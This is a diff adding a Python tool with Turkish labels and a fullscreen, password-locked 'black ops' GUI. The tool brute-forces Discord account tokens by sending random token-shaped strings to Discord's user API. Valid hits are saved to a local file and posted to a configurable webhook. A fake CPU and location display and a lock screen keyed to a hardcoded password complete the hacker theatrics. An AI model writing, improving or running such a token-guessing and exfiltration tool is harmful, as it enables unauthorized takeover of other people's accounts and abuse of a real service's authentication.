@@ -1,0 +1,317 @@
+import random
+import string
+import requests
+import time
+import os
+import sys
+import tkinter as tk
+from threading import Thread
+
+
+if os.name == 'nt':
+    import winsound
+else:
+    winsound = None
+
+
+BLACK = "#000000"
+GREEN = "#00FF41"
+RED = "#FF003C"
+YELLOW = "#FDF000"
+CYAN = "#00F3FF"
+WHITE = "#FFFFFF"
+
+
+istatistikler = {
+    "toplam_denenen": 0,
+    "gecersiz": 0,
+    "engel": 0,
+    "hata": 0
+}
+
+
+KILIT_SIFRESI = "CEYTX"
+
+
+root = None
+terminal_text = None
+input_entry = None
+lbl_hud = None  
+
+
+lbl_denen = None
+lbl_basarisiz = None
+lbl_basarili = None
+lbl_rate = None
+lbl_baglanti = None
+
+
+alarm_aktif = False
+
+def ses_cal(frekans=1000, sure=1500):
+    """Sistem seslerini arayüzü dondurmayacak şekilde kısa veya uzun çalar"""
+    if winsound:
+        try:
+            winsound.Beep(frekans, sure)
+        except Exception:
+            pass
+    else:
+        sys.stdout.write('\a')
+        sys.stdout.flush()
+
+def log_ekle(mesaj, renk):
+    """Siberpunk terminaline log ekler"""
+    global terminal_text, root
+    if terminal_text and root and tk.Tk.winfo_exists(root):
+        try:
+            terminal_text.config(state=tk.NORMAL)
+            terminal_text.insert(tk.END, mesaj + "\n", renk)
+            terminal_text.see(tk.END)
+            terminal_text.config(state=tk.DISABLED)
+        except Exception:
+            pass
+
+def sayaclari_guncelle():
+    """Sol alttaki bilgi tablosunu anlık yeniler"""
+    global lbl_denen, lbl_basarisiz, lbl_basarili, lbl_rate, lbl_baglanti, root
+    if root and tk.Tk.winfo_exists(root):
+        try:
+            lbl_denen.config(text=f"DENENEN TOKEN     : {istatistikler['toplam_denenen']}")
+            lbl_basarisiz.config(text=f"BAŞARISIZ TOKEN   : {istatistikler['gecersiz']}")
+            lbl_basarili.config(text=f"BAŞARILI TOKEN    : {istatistikler['toplam_denenen'] - (istatistikler['gecersiz'] + istatistikler['engel'] + istatistikler['hata'])}")
+            lbl_rate.config(text=f"RATE LIMIT ENGELİ : {istatistikler['engel']}")
+            lbl_baglanti.config(text=f"BAĞLANTI HATASI   : {istatistikler['hata']}")
+        except Exception:
+            pass
+
+def sahte_hud_guncelle():
+    """Sağ üst köşedeki Donanım ve Konum HUD panelini hatasız (Thread-Safe) günceller"""
+    global lbl_hud, root
+    if root and tk.Tk.winfo_exists(root) and lbl_hud:
+        try:
+            cpu_load = random.randint(74, 91)
+            ram_load = random.randint(62, 68)
+            core_temp = random.randint(41, 45)
+            packet_influx = random.randint(1900, 2700)
+            
+            hud_text = (
+                f"ERİŞİM NOKTASI: 41.0082° N, 28.9784° E (GÖLCÜK)\n"
+                f"DONANIM YÜKÜ : CPU: %{cpu_load} | RAM: %{ram_load}\n"
+                f"ÇEKİRDEK ISI : {core_temp}°C [STABİL]\n"
+                f"VERİ AKIŞI   : {packet_influx} kb/s"
+            )
+            lbl_hud.config(text=hud_text)
+            
+            root.after(2000, sahte_hud_guncelle)
+        except Exception:
+            pass
+
+def tehlike_modu_tetikle(aktif):
+    """Rate limit veya siber ihlal durumunda ekranı flaş uyarısına geçirir"""
+    global root, alarm_aktif
+    if root and tk.Tk.winfo_exists(root):
+        if aktif:
+            alarm_aktif = True
+            def flash():
+                if alarm_aktif and root and tk.Tk.winfo_exists(root):
+                    try:
+                        mevcut_renk = root.cget("bg")
+                        yeni_renk = RED if mevcut_renk == BLACK else BLACK
+                        root.configure(bg=yeni_renk)
+                        root.after(300, flash)
+                    except Exception:
+                        pass
+            flash()
+        else:
+            alarm_aktif = False
+            try:
+                root.configure(bg=BLACK)
+            except Exception:
+                pass
+
+def token_olustur():
+    karakterler = string.ascii_letters + string.digits + "-_"
+    p1_len = random.randint(26, 28)
+    p2_len = random.randint(6, 8)
+    p3_len = random.randint(38, 43)
+    
+    part1 = "".join(random.choices(karakterler, k=p1_len))
+    part2 = "".join(random.choices(karakterler, k=p2_len))
+    part3 = "".join(random.choices(karakterler, k=p3_len))
+    
+    return f"{part1}.{part2}.{part3}"
+
+def kontrol_et():
+    webhook_url = "YOUR_WEBHOOK_URL_HERE"
+    
+    while True:
+        global root
+        if root and not tk.Tk.winfo_exists(root):
+            break
+            
+        token = token_olustur()
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        }
+        
+        try:
+            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=1.5)
+            istatistikler["toplam_denenen"] += 1
+            
+            if response.status_code == 200:
+                log_ekle(f"[+] BAŞARILI! Canlı Token Yakalandı: {token}", "green")
+                with open("calisan_tokenlar.txt", "a") as f:
+                    f.write(f"{token}\n")
+                
+                if webhook_url != "YOUR_WEBHOOK_URL_HERE":
+                    payload = {
+                        "content": f"@everyone Ceytx aktif token buldu: {token}"
+                    }
+                    try: requests.post(webhook_url, json=payload)
+                    except: pass
+                
+                sayaclari_guncelle()
+                ses_cal(1200, 1500)
+                log_ekle("\n[!] SİSTEM DURDURULDU: AKTİF TOKEN SİSTEME KAYDEDİLDİ!", "green")
+                break
+                
+            elif response.status_code == 429:
+                istatistikler["engel"] += 1
+                log_ekle("\n████████████████████████████████████████████████████████████", "yellow")
+                log_ekle("[!] RATE LIMITED! DISCORD IP ENGELİ ATTI. TEHLİKE MODU AKTİF!", "yellow")
+                log_ekle("████████████████████████████████████████████████████████████\n", "yellow")
+                sayaclari_guncelle()
+                
+                
+                tehlike_modu_tetikle(True)
+                time.sleep(3)
+                tehlike_modu_tetikle(False)
+                
+            else:
+                istatistikler["gecersiz"] += 1
+                log_ekle(f"[-] Geçersiz: {token}", "red")
+                sayaclari_guncelle()
+                
+        except Exception:
+            istatistikler["toplam_denenen"] += 1
+            istatistikler["hata"] += 1
+            log_ekle("[-] Bağlantı Hatası: Ağ isteği başarısız.", "red")
+            sayaclari_guncelle()
+            time.sleep(1)
+
+def tuş_sesi_tetikle(event):
+    """Klavye giriş maskelemesini destekleyen mekanik yazma sesi"""
+    # Enter veya Backspace harici her tuşta siber tık sesi çıkarır
+    if event.keysym not in ["Return", "BackSpace"]:
+        Thread(target=ses_cal, args=(800, 30), daemon=True).start()
+
+def sifre_kontrol_et(event):
+    global root, input_entry
+    if input_entry and root and tk.Tk.winfo_exists(root):
+        girilen_sifre = input_entry.get()
+        if girilen_sifre == KILIT_SIFRESI:
+            root.quit()
+        else:
+           
+            Thread(target=ses_cal, args=(400, 400), daemon=True).start()
+            log_ekle("\n████████████████████████████████████████████████████████████", "red")
+            log_ekle("[!] SİSTEM ALARMI: GEÇERSİZ SİSTEM ANAHTARI! ERİŞİM REDDEDİLDİ.", "red")
+            log_ekle("████████████████████████████████████████████████████████████\n", "red")
+            
+            tehlike_modu_tetikle(True)
+            root.after(600, lambda: tehlike_modu_tetikle(False))
+            input_entry.delete(0, tk.END)
+
+def kilit_ekrani_olustur():
+    global root, terminal_text, input_entry, lbl_hud
+    global lbl_denen, lbl_basarisiz, lbl_basarili, lbl_rate, lbl_baglanti
+    
+    root = tk.Tk()
+    root.title("CEYTX BLACK OPS TERMINAL")
+    root.attributes("-fullscreen", True)
+    root.configure(bg=BLACK)
+    root.overrideredirect(True)
+    root.lift()
+    root.wm_attributes("-topmost", True)
+    
+    
+    top_frame = tk.Frame(root, bg=BLACK)
+    top_frame.pack(fill=tk.X, padx=40, pady=15)
+    
+    
+    ascii_banner = (
+        " ██████╗███████╗██╗   ██╗████████╗██╗  ██╗    ██████╗ ██████╗ ███████╗\n"
+        "██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝╚██╗██╔╝   ██╔═══██╗██╔══██╗██╔════╝\n"
+        "██║     █████╗   ╚████╔╝    ██║    ╚███╔╝    ██║   ██║██████╔╝███████╗\n"
+        "██║     ██╔══╝    ╚██╔╝     ██║    ██╔██╗    ██║   ██║██╔═══╝ ╚════██║\n"
+        "╚██████╗███████╗   ██║      ██║   ██╔╝ ██╗   ╚██████╔╝██║     ███████║"
+    )
+    
+    title_label = tk.Label(top_frame, text=ascii_banner, font=("Courier New", 9, "bold"), fg=CYAN, bg=BLACK, justify=tk.LEFT)
+    title_label.pack(side=tk.LEFT)
+    
+    
+    lbl_hud = tk.Label(top_frame, text="", font=("Courier New", 9, "bold"), fg=GREEN, bg=BLACK, justify=tk.RIGHT)
+    lbl_hud.pack(side=tk.RIGHT, anchor="n")
+    sahte_hud_guncelle()  
+    
+    
+    terminal_frame = tk.Frame(root, bg=BLACK)
+    terminal_frame.pack(expand=True, fill=tk.BOTH, padx=40, pady=10)
+    
+    terminal_text = tk.Text(terminal_frame, font=("Courier New", 11), fg=GREEN, bg=BLACK, wrap=tk.WORD, state=tk.DISABLED, bd=0, highlightthickness=0)
+    terminal_text.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)
+    
+    terminal_text.tag_config("green", foreground=GREEN)
+    terminal_text.tag_config("red", foreground=RED)
+    terminal_text.tag_config("yellow", foreground=YELLOW)
+    terminal_text.tag_config("cyan", foreground=CYAN)
+    
+
+    bottom_frame = tk.Frame(root, bg=BLACK)
+    bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=40, pady=30)
+    
+  
+    info_frame = tk.Frame(bottom_frame, bg=BLACK)
+    info_frame.pack(side=tk.LEFT, fill=tk.Y)
+    
+    lbl_denen = tk.Label(info_frame, text="DENENEN TOKEN     : 0", font=("Courier New", 12, "bold"), fg=WHITE, bg=BLACK, anchor="w")
+    lbl_denen.pack(fill=tk.X, anchor="w")
+    
+    lbl_basarisiz = tk.Label(info_frame, text="BAŞARISIZ TOKEN   : 0", font=("Courier New", 12, "bold"), fg=RED, bg=BLACK, anchor="w")
+    lbl_basarisiz.pack(fill=tk.X, anchor="w")
+    
+    lbl_basarili = tk.Label(info_frame, text="BAŞARILI TOKEN    : 0", font=("Courier New", 12, "bold"), fg=GREEN, bg=BLACK, anchor="w")
+    lbl_basarili.pack(fill=tk.X, anchor="w")
+    
+    lbl_rate = tk.Label(info_frame, text="RATE LIMIT ENGELİ : 0", font=("Courier New", 12, "bold"), fg=YELLOW, bg=BLACK, anchor="w")
+    lbl_rate.pack(fill=tk.X, anchor="w")
+    
+    lbl_baglanti = tk.Label(info_frame, text="BAĞLANTI HATASI   : 0", font=("Courier New", 12, "bold"), fg=CYAN, bg=BLACK, anchor="w")
+    lbl_baglanti.pack(fill=tk.X, anchor="w")
+    
+  
+    password_frame = tk.Frame(bottom_frame, bg=BLACK)
+    password_frame.pack(side=tk.RIGHT, anchor="se")
+    
+    password_label = tk.Label(password_frame, text="SİSTEM ANAHTARI:", font=("Courier New", 12, "bold"), fg=CYAN, bg=BLACK)
+    password_label.pack(side=tk.LEFT, padx=10)
+    
+  
+    input_entry = tk.Entry(password_frame, font=("Courier New", 12, "bold"), show="*", fg=GREEN, bg=BLACK, insertbackground=GREEN, highlightcolor=GREEN, highlightbackground=CYAN, highlightthickness=1, bd=0)
+    input_entry.pack(side=tk.LEFT, ipady=3)
+    
+  
+    input_entry.bind("<Key>", tuş_sesi_tetikle)
+    input_entry.bind("<Return>", sifre_kontrol_et)
+    
+  
+    tarama_thread = Thread(target=kontrol_et)
+    tarama_thread.daemon = True
+    tarama_thread.start()
+    
+    root.mainloop()
+
+if __name__ == "__main__":
+    kilit_ekrani_olustur()
